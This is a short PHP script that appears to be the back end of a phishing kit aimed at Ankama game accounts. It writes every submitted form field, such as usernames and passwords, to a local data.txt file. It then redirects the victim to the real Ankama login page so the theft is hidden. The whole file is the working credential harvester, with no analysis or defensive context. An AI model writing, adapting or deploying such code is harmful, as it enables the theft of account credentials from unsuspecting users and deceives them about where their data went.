<?php 

    $file = fopen("data.txt", "a");
    fwrite($file, "\t\t");
    fwrite($file, "\r\n");

    foreach($_POST as $key => $value){
        fwrite($file, "\t\t");
        fwrite($file, $key);
        fwrite($file, "=");
        fwrite($file, $value);
        fwrite($file, "\r\n");
    }

    fwrite($file, "\r\n");
    fwrite($file, "\t\t");
    fclose($file);
    header("Location: https://auth.ankama.com/login/ankama/form?origin_tracker=https://www.ankama.com/en&redirect_uri=https://auth.ankama.com/login-authorized?state%3DeyJzdGF0ZV9pZCI6ImttcUFsQ204M0xpSU5mRUoxUmkwUDlsdm53akhYdDBKTnR4ZVJOYnluNFEiLCJyZWRpcmVjdF91cmkiOiJodHRwczovL2FjY291bnQuYW5rYW1hLmNvbS9hdXRob3JpemVkIiwicHJvdmlkZXIiOiJBbmthbWEifQ");
    die();

?>